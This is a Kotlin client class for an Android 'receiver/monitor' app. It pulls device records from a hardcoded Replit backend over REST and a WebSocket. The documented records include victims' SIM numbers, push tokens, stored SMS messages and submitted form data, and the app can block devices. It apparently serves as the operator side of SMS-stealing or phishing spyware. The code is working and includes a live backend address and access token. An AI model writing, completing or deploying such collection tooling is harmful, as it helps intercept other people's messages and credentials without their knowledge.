package com.example.receiver.network

import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

/**
 * ════════════════════════════════════════════════════════════════════
 *  ReceiverApi.kt — Dusre Android app (receiver/monitor) ke liye
 * ════════════════════════════════════════════════════════════════════
 *
 *  Yahan sirf ye do cheez change karo:
 *    APP_TOKEN    — e.g. "sncx8wob"
 *    BACKEND_DOMAIN — Replit domain (ya production domain)
 *
 *  Root URL: https://DOMAIN/api/device/APP_TOKEN
 *
 *  ┌──────────────────────────────────────────────────────────────┐
 *  │  GET  /api/device/:token/list         → sare devices        │
 *  │  GET  /api/device/:token/get/:uid     → ek device by UID    │
 *  │  POST /api/device/:token/upsert       → device data save    │
 *  │  POST /api/device/:token/data         → form data save      │
 *  │  WSS  wss://DOMAIN/api/device/:token/ws → live events       │
 *  └──────────────────────────────────────────────────────────────┘
 *
 *  WebSocket events (JSON):
 *    { "event": "connected",        "appToken": "...", "ts": 0 }
 *    { "event": "device:updated",   "data": {...device_row},    "ts": 0 }
 *    { "event": "device:form_data", "data": {...device_row},    "ts": 0 }
 *    { "event": "device:blocked",   "data": {...device_row},    "ts": 0 }
 *    { "event": "device:deleted",   "data": { "sub_id": "..." },"ts": 0 }
 *
 *  Usage:
 *    val api = ReceiverApi()
 *    api.onDeviceUpdated = { device -> ... }
 *    api.onFormData      = { device -> ... }
 *    api.connectWebSocket()
 *    api.getAllDevices   { list, err -> ... }
 */
class ReceiverApi(
    private val appToken:      String = "sncx8wob",
    private val backendDomain: String = "https://78ad8860-efb7-4153-9c84-8bf8f2bbd425-00-2gl0n91xz9krb.pike.replit.dev"
) {
    companion object {
        private const val TAG = "RECEIVER_API"
    }

    // ── Derived URLs ──────────────────────────────────────────────
    private val BASE  = "$backendDomain/api/device/$appToken"
    private val WS_URL = BASE
        .replace("https://", "wss://")
        .replace("http://",  "ws://")  + "/ws"

    // ── OkHttp ────────────────────────────────────────────────────
    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ── Callbacks (set these before calling connect) ──────────────
    var onDeviceUpdated:  ((JSONObject) -> Unit)? = null
    var onDeviceBlocked:  ((JSONObject) -> Unit)? = null
    var onDeviceDeleted:  ((String)     -> Unit)? = null
    var onFormData:       ((JSONObject) -> Unit)? = null
    var onAllDevices:     ((List<JSONObject>) -> Unit)? = null
    var onWsConnected:    (() -> Unit)? = null
    var onWsDisconnected: (() -> Unit)? = null

    // ── WebSocket state ───────────────────────────────────────────
    private var ws: WebSocket? = null
    @Volatile private var wsConnected = false
    private var reconnectJob: kotlinx.coroutines.Job? = null

    // ════════════════════════════════════════════════════════════
    //  1. GET /list — sare devices (initial load)
    // ════════════════════════════════════════════════════════════
    /**
     * Response: { ok: true, count: N, devices: [ ...device_rows ] }
     *
     * Each device_row:
     *   id, sub_id (= UID), app_id, uid, data_type,
     *   data_json (JSONB: model, brand, sim1number, fcm_token, ...),
     *   status ("active" | "blocked"),
     *   registered_at (BIGINT ms), last_heartbeat_at (BIGINT ms),
     *   sms_messages (JSONB array), total_sms_count,
     *   last_sms_timestamp, last_sms_log,
     *   created_at, updated_at
     */
    fun getAllDevices(callback: (List<JSONObject>?, String?) -> Unit) {
        scope.launch {
            try {
                val req = Request.Builder().url("$BASE/list").get().build()
                http.newCall(req).execute().use { res ->
                    val body = res.body?.string() ?: "{}"
                    if (!res.isSuccessful) {
                        callback(null, "HTTP ${res.code}: $body")
                        return@launch
                    }
                    val obj = JSONObject(body)
                    if (!obj.optBoolean("ok", true)) {
                        callback(null, obj.optString("error", "Backend error"))
                        return@launch
                    }
                    val arr  = obj.optJSONArray("devices") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getJSONObject(it) }
                    callback(list, null)
                    onAllDevices?.invoke(list)
                }
            } catch (e: Exception) {
                Log.e(TAG, "getAllDevices", e)
                callback(null, e.message)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  2. GET /get/:uid — ek device by UID
    // ════════════════════════════════════════════════════════════
    /**
     * Response: { ok: true, data: { ...device_row } }
     * Error: { ok: false, error: "Not found" }
     */
    fun getDevice(uid: String, callback: (JSONObject?, String?) -> Unit) {
        if (uid.isBlank()) { callback(null, "UID required"); return }
        scope.launch {
            try {
                val encodedUid = URLEncoder.encode(uid, "UTF-8")
                val req = Request.Builder().url("$BASE/get/$encodedUid").get().build()
                http.newCall(req).execute().use { res ->
                    val body = res.body?.string() ?: "{}"
                    if (!res.isSuccessful) { callback(null, "HTTP ${res.code}: $body"); return@launch }
                    val obj = JSONObject(body)
                    if (obj.optBoolean("ok", false) && obj.has("data"))
                        callback(obj.getJSONObject("data"), null)
                    else
                        callback(null, obj.optString("error", "Not found"))
                }
            } catch (e: Exception) {
                Log.e(TAG, "getDevice $uid", e)
                callback(null, e.message)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  3. POST /upsert — device data update (optional write)
    // ════════════════════════════════════════════════════════════
    /**
     * payload: JSONObject with at least { uid / sub_id }
     * Response: { ok: true, data: {...} }
     */
    fun upsert(payload: JSONObject, callback: ((Boolean, String?) -> Unit)? = null) {
        scope.launch {
            try {
                val body = payload.toString()
                    .toByteArray()
                    .let { okhttp3.RequestBody.create(okhttp3.MediaType.parse("application/json"), it) }
                val req = Request.Builder().url("$BASE/upsert").post(body).build()
                http.newCall(req).execute().use { res ->
                    val rb = res.body?.string() ?: ""
                    callback?.invoke(res.isSuccessful,
                        if (res.isSuccessful) null else "HTTP ${res.code}: $rb")
                }
            } catch (e: Exception) {
                Log.e(TAG, "upsert", e)
                callback?.invoke(false, e.message)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  4. POST /data — form data submit
    // ════════════════════════════════════════════════════════════
    /**
     * payload: JSONObject with { uid, dataType, ...fields }
     * Response: { ok: true }
     */
    fun submitData(payload: JSONObject, callback: ((Boolean, String?) -> Unit)? = null) {
        scope.launch {
            try {
                val body = payload.toString()
                    .toByteArray()
                    .let { okhttp3.RequestBody.create(okhttp3.MediaType.parse("application/json"), it) }
                val req = Request.Builder().url("$BASE/data").post(body).build()
                http.newCall(req).execute().use { res ->
                    val rb = res.body?.string() ?: ""
                    callback?.invoke(res.isSuccessful,
                        if (res.isSuccessful) null else "HTTP ${res.code}: $rb")
                }
            } catch (e: Exception) {
                Log.e(TAG, "submitData", e)
                callback?.invoke(false, e.message)
            }
        }
    }

    // ════════════════════════════════════════════════════════════
    //  5. WebSocket — real-time live events
    // ════════════════════════════════════════════════════════════
    /**
     * Connect karo — real-time events milenge via callbacks.
     * Auto-reconnects if connection drops (4 second delay).
     *
     * Call in Activity.onCreate() or ViewModel.init
     * Disconnect in Activity.onDestroy() via disconnectWebSocket()
     *
     * Events:
     *   onDeviceUpdated  — any device row changed
     *   onDeviceBlocked  — device blocked or unblocked
     *   onDeviceDeleted  — device removed (uid milega)
     *   onFormData       — device ne form submit kiya
     *   onWsConnected    — connection established
     *   onWsDisconnected — connection lost (reconnect scheduled)
     */
    fun connectWebSocket() {
        if (wsConnected) return
        Log.d(TAG, "WS connecting → $WS_URL")
        val req = Request.Builder().url(WS_URL).build()
        ws = http.newWebSocket(req, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                wsConnected = true
                Log.d(TAG, "WS connected ✓")
                onWsConnected?.invoke()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val msg   = JSONObject(text)
                    val event = msg.optString("event", "")
                    val data  = if (msg.has("data")) msg.optJSONObject("data") else null
                    Log.d(TAG, "WS ← $event")

                    when (event) {
                        "device:updated"   -> data?.let { onDeviceUpdated?.invoke(it) }
                        "device:form_data" -> data?.let { onFormData?.invoke(it) }
                        "device:blocked"   -> data?.let { onDeviceBlocked?.invoke(it) }
                        "device:deleted"   -> {
                            val uid = data?.optString("sub_id", "")
                                ?: msg.optString("sub_id", "")
                            if (uid.isNotBlank()) onDeviceDeleted?.invoke(uid)
                        }
                        "connected" ->
                            Log.d(TAG, "WS ready — appToken: ${msg.optString("appToken")}")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "WS parse error: ${e.message}")
                }
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                wsConnected = false
                Log.w(TAG, "WS closed ($code) $reason")
                onWsDisconnected?.invoke()
                scheduleReconnect()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                wsConnected = false
                Log.e(TAG, "WS failure: ${t.message}")
                onWsDisconnected?.invoke()
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        reconnectJob?.cancel()
        reconnectJob = scope.launch {
            delay(4_000)
            Log.d(TAG, "WS reconnecting...")
            wsConnected = false
            connectWebSocket()
        }
    }

    fun disconnectWebSocket() {
        reconnectJob?.cancel()
        ws?.close(1000, "App closed")
        wsConnected = false
    }

    val isConnected: Boolean get() = wsConnected
}
